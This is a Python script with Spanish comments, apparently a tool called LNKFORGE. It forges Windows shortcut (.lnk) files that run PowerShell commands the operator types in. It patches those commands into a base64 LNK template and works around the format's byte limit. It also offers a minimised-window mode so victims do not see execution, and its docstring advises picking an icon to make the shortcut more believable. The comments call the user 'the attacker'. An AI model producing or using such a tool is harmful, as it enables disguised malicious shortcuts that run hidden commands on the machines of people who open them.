import base64
import time

# Se obtiene la fecha y se da nombre al lnk si es que se guarda con el año el dia y minuto
date_ = time.localtime()
name_file_save = f"lnk_forged_{date_[0]}-{date_[2]}-{date_[4]}.lnk"

# Varaible que contiene los bytes a ocupar dentro del lnk 45 son las veces que se repite la cadena A9AD0APQ en el
# base64 original
b64_extra_bytes = "ACAAIgAg"+"AD0APQA9"*45+"AD0APQAgACI"

# Varibale que limita el relleno de bytes
max_bytes = len(b64_extra_bytes)
buffer_ = ""

# Diccionario encargado de traducir el tipo de lnk a lineas especificadas en el archivo b64
json_lines = {

    "normal": 0,
    "minimal": 1,

    "normal-icon": 2,
    "minimal-icon" :3

}

# Variable tendra el valor de normal si no se usa el minimal
line_ = json_lines["normal"]

"""
:: INFORMACION GENERAL ::

La variable b64_extra_bytes contiene un base64, que decodificandolo en UTF-16BE da como resultado
" ================================ "
Esto dentro del lnk, a la hora de crearlos, genera espacio dentro del propio programa, es decir
la memoria total que carga consigo dentro el lnk. Si no genero el espacio suficiente dentro de este "relleno" por asi decirlo,
los comandos se cortaran justo con el limitante de bytes necesarios para ejecutar. 

Por ejemplo, use los siguientes comandos en el programa:

- ls
- pause
- pwd
- systeminfo

Sin embargo, el lnk original del base64 que estamos usando solo contiene:

- ls
- pause

Lo que signifca que los siguientes comandos si bien pueden ejecutarse, se quedaran a la mitad
debido a la limitante de bytes en el formato original del LNK. Para evitar eso generamos un nuevo
lnk que ejecute powershell.

:: CREACION DEL ACCESO_DIRECTO.LNK PARA DEVS :: 

Para hacer mas creible el acceso directo se puede usar un template creado desde windows con estas
caracteristicas sin embargo se corrompe tras irrumpir la estructura original del LNK:

 - Ruta del acceso directo: C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command " ========================================================================================================================================= "
 - Icono a escoger
 - Pantalla: Minimizada (Para que no se vea al ejecutarse)

Luego con wsl o pasando el archivo a WSL con base 64 ejecutamos el siguiente comando:
 - base64 nombre.lnk > temp.txt

Una vez codificado a base64 necesitamos eliminar todos los saltos de linea del base64.
Copiamos el contenido del temp.txt y lo pegamos en: https://pinetools.com/es/eliminar-saltos-linea

Una vez limpiado, este archivo nos servira para ser utilizado en esta herramienta. Esto se hace
reemplazando el archivo original del template.

Eres libre de experimentar con el tamaño maximo de bytes que aceptan estos LNK corruptos desde Linux.
Digo "corruptos" porque siguen siendo funcionales a pesar de su modificacion tan "casera" hasta el momento
la sentencia mas larga es esta la cual consta de 137 caracteres que codificados a UTF-16BE son 274 bytes.

LNK desde windows, tiene un limite mayor al que se refiere en la interfaz grafica. Es decir
que si yo coloco muchos ======================================= " y haya terminado bien
con '= "' en el codigo base64 no se ve reflejado que este completo a pesar de tener cambios
como por ejemplo en extrabytes normal.

AD0: ES =
AD0APQ: ES ==
AD0APQA9: ES ===

!! "=" Esta codificado a UTF-16BE !!

Esta informacion es crucial para lograr comprender la estructura de donde se encuentra la cadena
a reemplazar por comandos embebidos.
"""

print(""":: LNKFORGE :: =>> [INFO]
:: Todo lo que escribas a continuacion quedara guardado como acceso directo ::
:: estos comandos se ejecutaran cuando abran el LNK dentro de la maquina ::
  
    > minimal :: La ventana de comandos se ejecutara en minimizado.
      minimal-icon :: LNK minimizado con icono.

    > normal  :: La ventana de comandos se ejecutara en primer plano.
      normal-icon :: LNK en primer plano con icono.
""")

# Funcion encargada de devolver la longitud del b64 de los comandos, o codificada a base64 si lleva False
def check_len_or_save(commands_code, check_ = True):

    # Se le agregan las comillas dobles para que internamente el lnk valide -Command " buffer_ "
    total_commands = f' " {commands_code} " '
    var_return = base64.b64encode(total_commands.encode("UTF-16BE")).decode()

    if check_:
        return len(var_return)
    
    return var_return

# Entramos en un bulce que almacene el historial de comandos a ejecutar
while True:

    try:
        commands_ = input("cmd_lnk_executor >> ")

        # Si el comando es exit termina el bucle
        if commands_ == "exit":
            break
        
        # Si el atacante quiere que no se vea la ejecucion en powershell se marca como True
        # y se salta esta iteracion
        if commands_ in json_lines:
            print(f"[ALERT] LNK file switched to {commands_.upper()} =>> [OK]")
            line_ = json_lines[commands_]
            continue

        # El historial de comandos a ejecutar separados por un ;
        buffer_ = buffer_ + commands_+";"

        if max_bytes <= check_len_or_save(buffer_, True):
            print(f"[INFO] Limites de {str(max_bytes)} bytes maximos excedidos en LNK =>> [SAVE]")

            # Creamos una lista con los comandos a ejecutar y obtenemos el ultimo comando agregado y lo reemplazamos del str
            buffer_tmp = buffer_.split(";")
            delete_command_out_bytes = buffer_tmp[len(buffer_tmp)-2]+";"

            buffer_ = buffer_.replace(delete_command_out_bytes, "")
            break
    
    except KeyboardInterrupt:
        exit(0)

    except Exception as err:
        print(f"[ERROR] {err}")

# Se codifica el texto en UTF-16BE formato usado en powershell, para luego codificarlo a b64
# y transformarlo a str con .decode ( porque es binario )
code_ = check_len_or_save(buffer_, False)

# Abrimos el archivo base de powershell que estamos usando para reemplazar la cadena b64_extra_bytes por el codigo 
# en base64 de la variable code_, la cual contiene el codigo embebido a ejecutar
with open("modular_lnk.b64", "r", encoding="utf-8") as read_ps_b64, open(name_file_save, "wb") as save_bytes_lnk:

    # Aqui se obtiene el valor del diccionario, es decir que ocuparan por ejemplo: 0 para normal y 1 para ps minimizado
    all_b64 = read_ps_b64.readlines()[line_].replace(b64_extra_bytes, code_).replace("=", "").strip()

    # Si el resto de la division de la cantidad total de caracteres del archivo 
    # tiene un resto, se debe de igualar la cadena con "=" dependiendo del caso
    try:
        rest_ = len(all_b64) % 4
        print(f"""
        ---------------------
-----------INFORME-DE-CONVERSION-----------
        ---------------------
:: Tamaño en txt original: {len(all_b64)}
:: Resto original: {rest_}

-------------------------------------------""")
        if rest_ == 2:
            all_b64 = all_b64+"=="

        if rest_ == 3 or rest_ == 1:
            all_b64 = all_b64+"="

        try:
            # Y se guarda el archivo lnk en binario
            save_bytes_lnk.write(base64.b64decode(all_b64))

        except Exception as err:
            print(f"[ERROR] {err}")
            exit(0)

        print(f"""
:: Tamaño en txt ajustado: {len(all_b64)}
:: Resto resultante: {len(all_b64) % 4}
-------------------------------------------
[INFO] LNK guardado como {name_file_save}...
    """)
        
    except Exception as err:
        print(f"[ERROR] {err}")